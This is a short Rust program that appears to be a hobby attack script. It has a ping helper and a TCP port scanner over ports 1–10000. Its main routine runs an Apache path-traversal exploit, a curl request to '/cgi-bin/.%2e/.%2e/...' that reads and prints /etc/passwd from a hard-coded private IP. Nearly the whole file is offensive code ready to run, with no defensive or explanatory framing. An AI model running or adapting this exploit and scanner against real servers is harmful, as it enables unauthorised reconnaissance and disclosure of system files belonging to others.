use std::net::TcpStream;
use std::process::{Command, Output};
use reqwest;
use reqwest::{RequestBuilder, Url};

fn ping_ip(ip_address: &str) -> Result<(), String> {
    let command = Command::new("ping")
        .arg("-c")
        .arg("4") // Nombre de paquets à envoyer
        .arg(ip_address)
        .output()
        .map_err(|e| format!("Failed to execute ping command: {}", e))?;

    if command.status.success() {
        println!("Ping successful to {}", ip_address);
        Ok(())
    } else {
        let error_message = String::from_utf8_lossy(&command.stderr);
        Err(format!("Failed to ping {}: {}", ip_address, error_message))
    }
}

fn scan_ports(target_ip: &str) {
    println!("Scanning ports ");

    for port in 1..=10000 {
        let address = format!("{}:{}", target_ip, port);
        match TcpStream::connect(address) {
            Ok(_) => println!("Port {} is open", port),
            Err(_) => {} // Ignore errors, assuming port is closed
        }
    }
}



async fn exploit_apache(target_ip: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let url = format!("http://{}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", target_ip);
    let command_output: Output = Command::new("curl")
        .arg("-X")
        .arg("POST")
        .arg(url)
        .output()
        .map_err(|e| format!("Failed to execute command: {}", e))?;

    if command_output.status.success() {
        let result_str = String::from_utf8_lossy(&command_output.stdout);
        println!("{}", result_str);
        Ok(())
    } else {
        let error_message = String::from_utf8_lossy(&command_output.stderr);
        Err(format!("Failed: {}", error_message).into())
    }
}





#[tokio::main]
async fn main() {
    let ip_address = "192.168.1.122";

    //match ping_ip(ip_address) {
    //    Ok(_) => scan_ports(ip_address),
    //    Err(_) => {}
    //}
    exploit_apache(ip_address).await.expect("TODO: panic message");

}
